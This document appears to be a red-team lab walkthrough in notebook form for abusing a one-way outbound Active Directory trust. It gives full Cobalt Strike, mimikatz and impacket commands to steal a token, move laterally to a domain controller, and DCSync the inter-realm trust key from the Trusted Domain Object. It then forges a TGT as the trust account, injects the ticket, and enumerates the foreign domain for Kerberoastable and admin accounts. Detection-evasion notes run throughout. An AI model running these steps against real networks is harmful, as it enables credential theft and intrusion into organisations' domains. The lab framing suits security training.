# Outbound Trusts Lab

> The objective for this lab is to perform enumeration across a one-way outbound trust by abusing the inter-realm trust key stored in the Trusted Domain Object (TDO).

===

## Trust Relationship  

This lab is the **opposite direction** to the Inbound Trusts lab  

```
┌─────────────────────────────────────┐        ┌─────────────────────────────────────┐
│           PARTNER.COM               │        │          CONTOSO.COM                │
│  (OUR domain — beacon runs here)    │        │  (foreign domain — target of enum)  │
│                                     │        │                                     │
│  Domain SID:                        │        │  Domain SID:                        │
│  S-1-5-21-4244029708-               │        │  S-1-5-21-3926355307-               │
│       1901239654-2578485347         │        │       1661546229-813047887          │
│                                     │        │                                     │
│  trustDirection = 2 (OUTBOUND) ─────┼───────►│  PARTNER trusts CONTOSO             │
│                                     │        │                                     │
│  Our resources trust CONTOSO users  │        │  DC: lon-dc-1.contoso.com           │
│  CONTOSO users can access US        │        │  KDC: 10.10.120.1                   │
└─────────────────────────────────────┘        └─────────────────────────────────────┘
         TRUSTING domain                                   TRUSTED domain
   (resources are here — our beacon)                 (accounts originate here)
```

**The normal flow** (legitimate):  
> CONTOSO users authenticate to PARTNER's DC → present credentials → access PARTNER resources. PARTNER users get nothing on CONTOSO (one-way).  

**The attack**:  
> We are on PARTNER (the trusting domain). We should have no access to CONTOSO (the trusted domain).  
> BUT — the inter-realm trust key is stored on BOTH sides.  
> We can DCSync PARTNER's TDO to get that shared key, then use it to authenticate to CONTOSO's KDC as the trust account.  
> This gets us an authenticated foothold in CONTOSO for enumeration.  

---

## What Is a Trusted Domain Object (TDO)?

When a trust is created, each domain stores a `trustedDomain` object in its `CN=System` partition. This object holds:
- The FQDN and SID of the partner domain
- Trust direction and attributes
- The **inter-realm trust key** — a shared secret (password hash) that both KDCs use to sign cross-realm tickets

The trust key is what makes this attack possible. It is stored in the TDO like a machine account password. DCSync can replicate it just like any other secret — but you must reference the TDO by **object GUID** because it is not a user account.

---

## Trust Account — PARTNER$ in CONTOSO

When PARTNER established this trust, CONTOSO automatically created an account named **`PARTNER$`** in its own directory. This account's password is the inter-realm trust key (the same secret stored in PARTNER's TDO). It functions like a machine account — it represents the PARTNER domain boundary to CONTOSO's KDC.

When CONTOSO's KDC receives a cross-realm ticket from PARTNER users, it validates the ticket using PARTNER$'s key. By obtaining that key, we can authenticate as PARTNER$ directly to CONTOSO's KDC and receive a legitimate TGT — one that gives us authenticated read access to CONTOSO's directory.

```
What we have:            What we want:
PARTNER DA access   →    Enumerate CONTOSO (find Kerberoastable accounts,
                         users, groups, further attack paths)

The bridge:
TDO inter-realm key (DCSync from PARTNER) → authenticate as PARTNER$ to CONTOSO KDC
→ TGT for PARTNER$@CONTOSO → LDAP queries against CONTOSO
```

## Attack Flow Overview

1. Launch Cobalt Strike and connect to the team server.
2. Interact with Beacon and enumerate the trust.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatName
    ```

    > Queries PARTNER's domain for all `trustedDomain` objects. Each trust is represented as one of these objects in `CN=System,DC=partner,DC=com`. The attributes tell us:
    > - `trustPartner` — FQDN of the other domain (will show `contoso.com`)
    > - `trustDirection` — direction integer from OUR (PARTNER) perspective
    > - `trustAttributes` — flags (8 = forest trust with SID filtering)
    > - `flatName` — NetBIOS name of the partner (e.g. `CONTOSO`)

⚠️ What do these results mean?
    >
    > - `trustDirection 2` = **TRUST_DIRECTION_OUTBOUND** — PARTNER trusts CONTOSO. The trust arrow points away from us. CONTOSO users can access PARTNER resources. We (PARTNER users) cannot normally access CONTOSO.
    > - `trustAttributes 8` = **TRUST_ATTRIBUTE_FOREST_TRANSITIVE** — forest-level trust. SID filtering is enforced at the boundary — SID history injection is blocked. We cannot forge arbitrary SIDs into Kerberos tickets crossing the boundary (unlike within the same forest).

3. Get the GUID of the TDO.

    ```Beacon-nocolor
    ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID
    ```

    > **Why we need the GUID:** DCSync normally replicates user or computer account objects identified by their `sAMAccountName`.  
    The TDO is a `trustedDomain` object stored in `CN=System`.  
    To replicate it with DCSync (mimikatz `lsadump::dcsync`), you must identify the object by its `objectGUID` using the `/guid:` flag.
    >
    > The GUID returned `{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}` is PARTNER's TDO object for the CONTOSO trust. Note it — this is `[TDO_GUID]` used in step 5.

4. Inject a Beacon payload into a *vwebber* process.

>DCSync requires the replication privileges `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.  

```
process_browser
steal_token <pid>
```

> **OPSEC-🟠CAUTION** 
 Process injection generates telemetry. Prefer `steal_token <pid>` (no new thread injection) over `inject` if the goal is just token impersonation for the DCSync call.

> ⚠️ **Lateral move to par-dc-1 — `jump scshell64` will fail if `defragsvc` is already running (confirmed 2026-04-29):**
> scshell modifies the service binary path and then calls `StartService`. Error 1056 (`ERROR_SERVICE_ALREADY_RUNNING`) means scshell ran but can't restart the service to execute the payload. Fall back to `jump winrm64 par-dc-1 smb` which has no service dependency.  

5. Use the new Beacon to DCSync the shared inter-realm key from the TDO.

```Beacon-nocolor
mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}
```

⚠️ CONFIRMED: CS `dcsync` CANNOT extract TDO objects (tested 2026-04-29)

`dcsync partner.com PARTNER\CONTOSO$` fails with `ERROR kull_m_rpc_drsr_CrackNames: ERROR_NOT_FOUND`  
**Why:** CS `dcsync` uses `CrackNames` internally to resolve the target account. TDO objects (`trustedDomain` in `CN=System`) have no `sAMAccountName` — `CrackNames` cannot resolve them. Only mimikatz `/guid:` bypasses `CrackNames` and targets the object directly by GUID.

**OPSEC-safer alternative — impacket-secretsdump via SOCKS (🟠CAUTION, no beacon-thread mimikatz):**
```cs
// In beacon on par-dc-1:
socks 1080 socks5
```
```bash
# Kali Docker — set proxychains then extract LSA secrets (includes trust keys):
nano /etc/proxychains.conf   # socks5 10.0.0.5 1080
proxychains impacket-secretsdump PARTNER/vwebber:'[PASS]'@par-dc-1.partner.com -just-dc-ntlm
```
> impacket-secretsdump uses its own DCSync implementation and supports TDO extraction without needing GUID resolution via CrackNames. Trust keys appear as `$CONTOSO` in the LSA secrets section of the output.

---

OPSEC-🔴UNSAFE (required for CS-only path — no alternative within beacon)
Performs a DCSync replication request against PARTNER's DC (`/domain:partner.com` targets PARTNER's DC — this is OUR domain). The `/guid:` flag tells mimikatz to replicate the specific TDO object rather than a user account.
    >
    > The TDO object stores the trust password in the same way a machine account stores its password. Mimikatz extracts:
    > - `rc4_hmac_nt` — the RC4 (NT hash) of the trust key → this is `[TRUST KEY]` used in step 6
    > - `aes256_hmac` — AES256 version of the trust key (prefer this if the command supports it)
    >
    > Note the `rc4_hmac_nt` value from the output.
    >
    > **OPSEC-🔴UNSAFE** — DCSync generates **Event 4662** on PARTNER's DC. Running DCSync against the TDO (rather than a user account) is unusual and may stand out in logs compared to a normal user account DCSync. Use AES256 if available.
    >
    > ⚠️ **`[Out]` vs `[Out-1]` — ALWAYS use `[Out]` (confirmed 2026-04-29):** The TDO output shows two entries — `[Out]` (current key) and `[Out-1]` (previous rotation key). Using `[Out-1]` rc4 hash causes `krb_asktgt` to fail with **Kerberos error 24** (`KDC_ERR_PREAUTH_FAILED`). Always grab hashes from the `[Out]` block only. Prefer `aes256_hmac` over `rc4_hmac_nt`.

6. Request a TGT for the trust account using the shared secret.

    ```Beacon-nocolor
    krb_asktgt /user:PARTNER$ /aes256:[TRUST KEY AES256 from [Out]] /domain:contoso.com /dc:lon-dc-1.contoso.com
    ```

    > **What this does:** Sends an AS-REQ (Kerberos authentication request) to **CONTOSO's KDC** (`/dc:lon-dc-1.contoso.com` — note this is the FOREIGN domain's DC, not ours) requesting a TGT for the account `PARTNER$` in `contoso.com`.
    >
    > **Why `PARTNER$` in `contoso.com`?** When PARTNER established the outbound trust to CONTOSO, CONTOSO automatically created a trust account called `PARTNER$` in its own `CN=Users,DC=contoso,DC=com`. This account's password is the inter-realm trust key — the same RC4 hash we just DCSync'd from PARTNER's TDO. Both sides share the secret.
    >
    > CONTOSO's KDC receives our AS-REQ, validates the RC4 pre-auth against `PARTNER$`'s stored key, and issues a TGT for `PARTNER$@CONTOSO.COM`.
    >
    > **Ticket in hand:** `TGT_PARTNER$` — a valid Kerberos TGT, issued by CONTOSO's KDC, for the `PARTNER$` account. This is an authenticated identity inside CONTOSO's Kerberos realm. `PARTNER$` is treated as a low-privilege domain account in CONTOSO — enough for LDAP enumeration.
    >
    > **OPSEC-🟠CAUTION** — Generates **Event 4768** (AS-REQ) on CONTOSO's DC (`lon-dc-1`). The account name `PARTNER$` authenticating via RC4 from an unexpected source IP may flag in MDI or SIEM. CONTOSO's defenders would see an authentication from a non-DC machine for the trust account.

7. Inject the TGT into a sacrificial logon session.

    > **Why a sacrificial session?** Injecting a ticket into your current beacon logon session would overwrite or conflict with your existing Kerberos state. A sacrificial session is a fresh, isolated logon session (created via `make_token` with dummy credentials, then ticket injection) that you can discard cleanly. All subsequent Kerberos activity using CONTOSO's TGT runs in this isolated session — your primary beacon session is unaffected.

    **Step 7a — Create a sacrificial logon session:**

    ```Beacon-nocolor
    make_token CONTOSO\PARTNER$ FakePassword
    ```

    > Creates a new Type 9 logon session. The password is never validated over the network — it is a placeholder. The session exists purely to hold the injected ticket.

    **Step 7b — Decode base64 ticket to .kirbi on attacker desktop:**

    > **IMPORTANT:** `kerberos_ticket_use` expects a **file path to a `.kirbi` file** on the CS client (attacker desktop) — NOT a raw base64 string. Passing base64 directly causes the error: `'C:\Tools\cobaltstrike\client\doIFZD...' does not exist`.
    >
    > `kerberos_ticket_use` is the **recommended method** — it uses CS's native ticket injection via Windows API.  
    > No process spawn, no CLR load, no Rubeus signatures. Rubeus `ptt` via `execute-assembly` is OPSEC-🟠CAUTION spawns a sacrificial process and loads the .NET CLR  
    > avoid it for pure ticket injection when `kerberos_ticket_use` is available.  

    On attacker desktop PowerShell — decode base64 to .kirbi file:

    ```powershell
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\partner.kirbi", [Convert]::FromBase64String("[BASE64_TGT]"))
    ```

    Then inject via CS native command:

    ```Beacon-nocolor
    kerberos_ticket_use C:\Users\Attacker\Desktop\partner.kirbi
    ```

    > **OPSEC-🟢SAFE** — CS injects the ticket into the logon session via Windows Kerberos API. No process spawn, no CLR load, no disk write on the target. The `.kirbi` file lives only on the attacker desktop (CS client), never on the target machine.

8. Enumerate the trusted domain.

    ```Beacon-nocolor
    ldapsearch (objectClass=domain) --hostname contoso.com --dn DC=contoso,DC=com --attributes name,objectSid
    ```

    > **What this does:** Queries CONTOSO's LDAP using the injected `PARTNER$` TGT (our sacrificial session now authenticates as PARTNER$@CONTOSO). The `--hostname contoso.com` and `--dn DC=contoso,DC=com` explicitly target CONTOSO's directory — the foreign domain.
    >
    > `PARTNER$` has standard authenticated-user read access to CONTOSO's directory, which is sufficient for:
    > - Reading all user, group, and computer objects
    > - Finding Kerberoastable accounts (servicePrincipalName set)
    > - Finding AS-REP roastable accounts (no pre-auth required)
    > - Mapping group memberships, admin accounts, GPOs
    > - Identifying further trust relationships FROM CONTOSO
    >
    > **OPSEC-🟢SAFE** — LDAP queries from an authenticated account are normal domain behaviour. Generates **Event 1644** only under verbose LDAP logging (not default).

⚠️ In this lab, you have learned how to abuse the trust account to obtain a usable TGT for the foreign domain. These can be used to find potential vulnerabilities, such as Kerberoastable accounts.

===

## Post-Enumeration — What to Do With CONTOSO Access

Once you have a TGT for `PARTNER$@CONTOSO.COM` and can query CONTOSO's LDAP, pivot using these queries:

### Find Kerberoastable accounts in CONTOSO

```Beacon-nocolor
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,servicePrincipalName
```

> Any account with an SPN set can be Kerberoasted. Request a service ticket for their SPN — the ticket is encrypted with the account's hash and can be cracked offline. Run `krb_asktgs /service:<SPN> /ticket:[PARTNER$_TGT]` in the sacrificial session.

### Find AS-REP Roastable accounts in CONTOSO

```Beacon-nocolor
ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName
```

> `userAccountControl` flag `4194304` = `DONT_REQUIRE_PREAUTH`. These accounts return an AS-REP without needing pre-authentication — hash crackable offline without any credentials.

### Find DA accounts in CONTOSO

```Beacon-nocolor
ldapsearch (memberOf=CN=Domain Admins,CN=Users,DC=contoso,DC=com) --hostname contoso.com --dn DC=contoso,DC=com --attributes samAccountName,userAccountControl
```

### Find further trusts FROM CONTOSO

```Beacon-nocolor
ldapsearch (objectClass=trustedDomain) --hostname contoso.com --dn DC=contoso,DC=com --attributes trustDirection,trustPartner,trustAttributes
```

> CONTOSO may have its own trusts to additional domains — this extends your enumeration further. A trust chain (PARTNER → CONTOSO → THIRD_DOMAIN) could be exploited step by step.
